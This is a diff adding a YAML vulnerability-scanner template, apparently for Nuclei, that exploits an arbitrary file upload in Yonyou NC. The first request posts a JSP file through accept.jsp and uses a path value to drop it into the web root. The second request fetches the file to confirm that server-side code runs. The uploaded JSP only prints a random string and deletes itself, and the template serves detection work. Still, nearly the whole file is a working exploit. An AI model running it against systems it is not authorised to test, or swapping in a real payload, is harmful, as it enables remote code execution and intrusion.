@@ -1,0 +1,48 @@
+id: poc-yaml-yonyou-nc-file-accept-upload
+
+info:
+  name: poc-yaml-yonyou-nc-file-accept-upload
+  author: xiaobaicai
+  severity: critical
+  tags: xray-converted,fileupload,ct-469671
+  reference:
+    - https://decoded.avast.io/janneduchal/analysis-of-attack-against-national-games-of-china-systems/
+
+http:
+  - raw:
+      - |
+        POST /aim/equipmap/accept.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------16314487820932200903769468567
+
+        -----------------------------16314487820932200903769468567
+        Content-Disposition: form-data; name="upload"; filename="{{rand_base(8)}}.txt"
+        Content-Type: text/plain
+        
+        <% out.println("{{rand_base(8)}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        -----------------------------16314487820932200903769468567
+        Content-Disposition: form-data; name="fname"
+        
+        \webapps\nc_web\{{rand_base(8)}}.jsp
+        -----------------------------16314487820932200903769468567--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "afterUpload"
+  - raw:
+      - |
+        GET /{{rand_base(8)}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
